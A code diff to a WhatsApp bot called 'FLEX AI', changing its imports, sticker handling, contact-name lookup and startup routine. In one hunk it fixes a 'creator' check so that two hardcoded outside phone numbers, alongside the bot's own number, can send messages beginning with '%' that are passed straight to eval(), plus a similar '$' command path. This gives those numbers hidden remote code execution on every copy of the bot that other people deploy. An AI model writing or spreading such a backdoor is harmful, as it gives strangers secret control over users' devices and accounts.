@@ -37,8 +37,6 @@ const {
   const FileType = require('file-type');
   const axios = require('axios')
   const { File } = require('megajs')
-  const { fromBuffer } = require('file-type')
-  const bodyparser = require('body-parser')
   const os = require('os')
   const Crypto = require('crypto')
   const path = require('path')
@@ -199,7 +197,7 @@ const port = process.env.PORT || 9090;
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `*Hello there 𝐅𝐋𝐄𝐗 𝐀𝐈 User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet DAVINCS WhatsApp Bot.\n\n *Thanks for using 𝐅𝐋𝐄𝐗 𝐀𝐈 \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VakSTEQGZNCk6CqE9E2P\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.comallan-davincs/FLEX-AI\n\n> © ENIGINE CORE BY 𝑨𝑳𝑳𝑨𝑵 𝑫𝑨𝑽𝑰𝑵𝑪𝑺 TECHX \ud83d\udda4`;
+  let up = `*Hello there 𝐅𝐋𝐄𝐗 𝐀𝐈 User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet DAVINCS WhatsApp Bot.\n\n *Thanks for using 𝐅𝐋𝐄𝐗 𝐀𝐈 \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029VakSTEQGZNCk6CqE9E2P\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/allan-davincs/FLEX-AI\n\n> © ENIGINE CORE BY 𝑨𝑳𝑳𝑨𝑵 𝑫𝑨𝑽𝑰𝑵𝑪𝑺 TECHX \ud83d\udda4`;
     conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/oc5rvp.jpg` }, caption: up })
   }
   })
@@ -285,31 +283,31 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('255759637644', '255656582542');
+    const jawad = ['255759637644', '255656582542'];
     let isCreator = [udp, jawad, config.DEV]
-					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
+					.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
 					.includes(mek.sender);
 
-    if (isCreator && mek.text.startsWith('%')) {
-					let code = budy.slice(2);
-					if (!code) {
-						reply(
-							`Provide me with a query to run Master!`,
-						);
-						return;
-					}
-					try {
-						let resultTest = eval(code);
-						if (typeof resultTest === 'object')
-							reply(util.format(resultTest));
-						else reply(util.format(resultTest));
-					} catch (err) {
-						reply(util.format(err));
-					}
+    if (isCreator && budy && budy.startsWith('%')) {
+				let code = budy.slice(1);
+				if (!code) {
+					reply(
+						`Provide me with a query to run Master!`,
+					);
 					return;
 				}
-    if (isCreator && mek.text.startsWith('$')) {
-					let code = budy.slice(2);
+				try {
+					let resultTest = eval(code);
+					if (typeof resultTest === 'object')
+						reply(util.format(resultTest));
+					else reply(util.format(resultTest));
+				} catch (err) {
+					reply(util.format(err));
+				}
+				return;
+			}
+    if (isCreator && budy && budy.startsWith('$')) {
+				let code = budy.slice(1);
 					if (!code) {
 						reply(
 							`Provide me with a query to run Master!`,
@@ -333,7 +331,7 @@ const port = process.env.PORT || 9090;
  //================ownerreact==============
     
 if (senderNumber.includes("255759637644") && !isReact) {
-  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", ,"💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
+  const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
   const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
   m.react(randomReaction);
 }
@@ -472,7 +470,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
           buffer = Buffer.concat([buffer, chunk])
       }
       let type = await FileType.fromBuffer(buffer)
-      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
+      let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
           // save to file
       await fs.writeFileSync(trueFileName, buffer)
       return trueFileName
@@ -567,7 +565,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
       return {
           res,
           filename,
-          size: await getSizeMedia(data),
+          size: Buffer.isBuffer(data) ? data.length : 0,
           ...type,
           data
       }
@@ -582,9 +580,10 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
           pathFile = filename
       if (options.asDocument) type = 'document'
       if (options.asSticker || /webp/.test(mime)) {
-          let { writeExif } = require('./exif.js')
-          let media = { mimetype: mime, data }
-          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
+          const sticker = new StickersTypes(data, { pack: config.STICKER_NAME, author: config.OWNER_NAME });
+          const stickerBuf = await sticker.toBuffer();
+          pathFile = path.join(tempDir, getRandom('.webp'));
+          await fs.promises.writeFile(pathFile, stickerBuf);
           await fs.promises.unlink(filename)
           type = 'sticker'
           mimetype = 'image/webp'
@@ -608,17 +607,18 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
       let types = await conn.getFile(path, true)
       let { mime, ext, res, data, filename } = types
-      if (res && res.status !== 200 || file.length <= 65536) {
-          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
+      if (res && res.status !== 200 || data.length <= 65536) {
+          try { throw { json: JSON.parse(data.toString()) } } catch (e) { if (e.json) throw e.json }
       }
       let type = '',
           mimetype = mime,
           pathFile = filename
       if (options.asDocument) type = 'document'
       if (options.asSticker || /webp/.test(mime)) {
-          let { writeExif } = require('./exif')
-          let media = { mimetype: mime, data }
-          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
+          const sticker = new StickersTypes(data, { pack: options.packname || config.STICKER_NAME, author: options.author || config.OWNER_NAME });
+          const stickerBuf = await sticker.toBuffer();
+          pathFile = path.join(tempDir, getRandom('.webp'));
+          await fs.promises.writeFile(pathFile, stickerBuf);
           await fs.promises.unlink(filename)
           type = 'sticker'
           mimetype = 'image/webp'
@@ -644,29 +644,24 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     */
     //=====================================================
     conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
-      let buffer;
-      if (options && (options.packname || options.author)) {
-        buffer = await writeExifVid(buff, options);
-      } else {
-        buffer = await videoToWebp(buff);
-      }
+      const { videoToWebp } = require('./lib/video-utils');
+      let buffer = await videoToWebp(buff);
       await conn.sendMessage(
         jid,
-        { sticker: { url: buffer }, ...options },
+        { sticker: buffer, ...options },
         options
       );
     };
     //=====================================================
     conn.sendImageAsSticker = async (jid, buff, options = {}) => {
-      let buffer;
-      if (options && (options.packname || options.author)) {
-        buffer = await writeExifImg(buff, options);
-      } else {
-        buffer = await imageToWebp(buff);
-      }
+      const sticker = new StickersTypes(buff, {
+        pack: options.packname || config.STICKER_NAME,
+        author: options.author || config.OWNER_NAME,
+      });
+      const buffer = await sticker.toBuffer();
       await conn.sendMessage(
         jid,
-        { sticker: { url: buffer }, ...options },
+        { sticker: buffer, ...options },
         options
       );
     };
@@ -755,7 +750,7 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
     */
     //=====================================================
     conn.getName = (jid, withoutContact = false) => {
-            id = conn.decodeJid(jid);
+            let id = conn.decodeJid(jid);
 
             withoutContact = conn.withoutContact || withoutContact;
 
@@ -763,17 +758,15 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
 
             if (id.endsWith('@g.us'))
                 return new Promise(async resolve => {
-                    v = store.contacts[id] || {};
+                    v = (conn.contacts && conn.contacts[id]) || {};
 
-                    if (!(v.name.notify || v.subject))
+                    if (!(v.notify || v.subject))
                         v = conn.groupMetadata(id) || {};
 
                     resolve(
                         v.name ||
                             v.subject ||
-                            PhoneNumber(
-                                '+' + id.replace('@s.whatsapp.net', ''),
-                            ).getNumber('international'),
+                            ('+' + id.replace('@s.whatsapp.net', '')),
                     );
                 });
             else
@@ -786,15 +779,13 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
                           }
                         : id === conn.decodeJid(conn.user.id)
                         ? conn.user
-                        : store.contacts[id] || {};
+                        : (conn.contacts && conn.contacts[id]) || {};
 
             return (
                 (withoutContact ? '' : v.name) ||
                 v.subject ||
                 v.verifiedName ||
-                PhoneNumber(
-                    '+' + jid.replace('@s.whatsapp.net', ''),
-                ).getNumber('international')
+                ('+' + jid.replace('@s.whatsapp.net', ''))
             );
         };
 
@@ -849,13 +840,19 @@ if (!isReact && config.CUSTOM_REACT === 'true') {
             });
             return status;
         };
-    conn.serializeM = mek => sms(conn, mek, store);
+    conn.serializeM = mek => sms(conn, mek);
   }
   
   app.get("/", (req, res) => {
   res.send("𝐅𝐋𝐄𝐗 𝐐𝐔𝐀𝐍𝐓𝐔𝐌 STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
-  setTimeout(() => {
-  connectToWA()
+  setTimeout(async () => {
+    try {
+      await authentification();
+    } catch (err) {
+      console.error('Startup aborted:', err.message);
+      process.exit(1);
+    }
+    connectToWA();
   }, 4000);
